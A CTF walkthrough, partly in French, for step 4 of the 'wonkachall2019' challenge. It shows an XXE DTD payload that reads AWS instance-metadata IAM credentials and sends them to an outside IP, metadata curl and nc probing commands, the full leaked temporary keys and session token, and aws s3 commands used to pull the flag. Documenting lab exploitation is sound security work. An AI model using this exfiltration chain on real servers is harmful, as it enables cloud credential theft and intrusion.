# Step 4

> Next flag is : Lets check this bucket !

> You'll need credentials to access this awesome bucket full of stuff. 

## interesting files

* /etc/environment

```
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games" 
```

* .bash_history

```
sudo hostname 
sudo hostname 
sudo hostname backend-prod 
sudo nano /etc/hostname 
sudo mysql -u root -p 
ls 
sudo vim /etc/hostname 
exit 
sudo apt update && sudo apt upgrade 
sudo apt install nginx 
cd /etc/nginx/ 
ls 
cd sites-available/ 
ls 
vim default 
exit 
apt install nginx python3-pip 
sudo apt install nginx python3-pip 
sudo apt update 
sudo apt upgrade 
ls 
sudo apt install nginx python3-pip 
sudo vim /etc/nginx/nginx.conf 
sudo vim /etc/nginx/sites-available/ 
sudo vim /etc/nginx/sites-available/default 
exirt 
exit 
ls 
cd back/ 
ls 
rm -rf README.md __pycache__/ .git .gitignore flask_sessions/ 
mkdir flask_sessions 
mkdir uploads 
ls 
ls -la 
sudo pip3 install -r requirements.txt 
vim app.py 
ls python3 app.py sudo pip3 install lxml python3 app.py sudo pip3 install magic sudo pip3 install pymagic sudo pip3 install python-magic python3 app.py sudo pip3 install boto3 python3 app.py mysql -u website -p -h 35.181.126.120 sudo apt install mysql-client-core-5.7 mysql -u website -p -h 35.181.126.120 ip a mysql -u website -p -h 172.31.46.235 vim app.py python3 app.py sudo vim /etc/systemd/system/backend.service sudo pip3 install app:app sudo pip3 install gunicorn gunicorn app:app sudo systemctl daemon-reload sudo systemctl enable backend sudo systemctl start backend vim /etc/nginx/sites-enabled/default cd /etc/nginx/sites-enabled/ sudo vim default vim /etc/nginx/nginx.conf systemctl restart nginx sudo systemctl restart nginx journalctl -f -u backend.service cd vim back/app.py history mysql -u website -p -h 172.31.46.235 mysql -u website -p -h 172.31.46.235 website ls vim back/app.py sudo systemctl restart backend vim back/app.py sudo systemctl restart backend journalctl -f -u backend.service sudo certbot -d backend.willywonka.shop --manual --preferred-challenges dns certonly sudo apt install certbot sudo certbot -d backend.willywonka.shop --manual --preferred-challenges dns certonly sudo vim /etc/nginx/sites-enabled/default sudo systemctl restart nginx journalctl -f -u backend.service cd back/ ls vim app.py journalctl -e1000 -u backend.service journalctl -n1000 -u backend.service journalctl -en1000 -u backend.service vim app.py systemctl restart chakend sudo systemctl restart backend sudo journalctl -u backend -f vim app.py sudo systemctl restart backend sudo journalctl -u backend -f vim app.py sudo systemctl restart backend journalctl -en1000 -u backend.service vim app.py sudo systemctl restart backend journalctl -en1000 -u backend.service journalctl -f -u backend.service vim app.py sudo systemctl restart backend journalctl -f -u backend.service vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py python3 app.py vim app.py sudo systemctl restart backend ls cd / 

sudo vim flag.txt 
exit 
curl 
curl http://169.254.169.254/latest/meta-data/ 
curl 
curl http://169.254.169.254/latest/meta-data/iam 
curl 
curl http://169.254.169.254/latest/meta-data/iam/ 
curl 
curl http://169.254.169.254/latest/meta-data/iam/info 
curl 
curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3 
curl 
curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ 
ifcondfig 
ifconfig 
ping frontend-prod 
nc -vz 172.31.46.235 3306 
nc -vz 172.31.46.235 22 
nc -vz 172.31.46.235 3306 
nc -vz 172.31.46.235 3304 
nc -vz 172.31.46.235 3306 
ls 
cd back/ 
ls 
grep -nRi "test/" 
nano -c app.py 
ls 
sudo systemctl restart backend 
grep -nRi "
```

## S3 bucket

```
➜  wonkachall2019 git:(master) ✗ nslookup willywonka.shop         
Server:		192.168.140.2
Address:	192.168.140.2#53

Non-authoritative answer:
Name:	willywonka.shop
Address: 35.181.126.120

➜  wonkachall2019 git:(master) ✗ nslookup 35.181.126.120               
120.126.181.35.in-addr.arpa	name = ec2-35-181-126-120.eu-west-3.compute.amazonaws.com.
```

* creds aws

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

a renvoyé "EC2toS3", donc j'ai repris le chemin dans le bash_history, attention y a que le dernier qui n'est pas daubé parce que y a deux fois "iam" dans le path

du coup le `ro.dtd` :

```xml
<!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

output :

```json
{
   "Code":"Success",
   "LastUpdated":"2019-07-10T14:45:25Z",
   "Type":"AWS-HMAC",
   "AccessKeyId":"ASIAZ47IG35A4F6ZY2ML",
   "SecretAccessKey":"bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn",
   "Token":"AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=",
   "Expiration":"2019-07-10T20:55:48Z"
}
```

* connexion au bucket

```
➜  wonkachall2019 git:(master) ✗ aws configure
AWS Access Key ID [None]: ASIAZ47IG35A4F6ZY2ML
AWS Secret Access Key [None]: bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn
Default region name [None]: 
Default output format [None]: 
➜  wonkachall2019 git:(master) ✗ aws s3 ls    

An error occurred (InvalidAccessKeyId) when calling the ListBuckets operation: The AWS Access Key Id you provided does not exist in our records.
```

je vais essayer de récup les infos du bucket pour taper directemnt avec l'uri s3

```
http://169.254.169.254/latest/dynamic/instance-identity/document
```

output :

```json
{
   "devpayProductCodes":null,
   "marketplaceProductCodes":null,
   "accountId":"680702435137",
   "availabilityZone":"eu-west-3c",
   "ramdiskId":null,
   "kernelId":null,
   "pendingTime":"2019-07-04T16:23:26Z",
   "architecture":"x86_64",
   "privateIp":"172.31.39.217",
   "version":"2017-09-30",
   "region":"eu-west-3",
   "imageId":"ami-0119667e27598718e",
   "billingProducts":null,
   "instanceId":"i-0defb90fb5aafe95b",
   "instanceType":"t2.medium"
}
```

```bash
export AWS_ACCESS_KEY_ID=ASIAZ47IG35A4F6ZY2ML
export AWS_SECRET_ACCESS_KEY=bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn
export AWS_DEFAULT_REGION=eu-west-3                                  
export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=

aws s3 ls                                      
2019-07-04 18:41:42 willywonka-shop
```

* list file bucket

```
aws s3 ls s3://willywonka-shop      
                           PRE images/
                           PRE tools/
2019-07-05 13:54:47         65 Flag-04.txt
```

* get file

```
aws s3 cp s3://willywonka-shop/Flag-04.txt .
download: s3://willywonka-shop/Flag-04.txt to ./Flag-04.txt

cat Flag-04.txt 
0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
```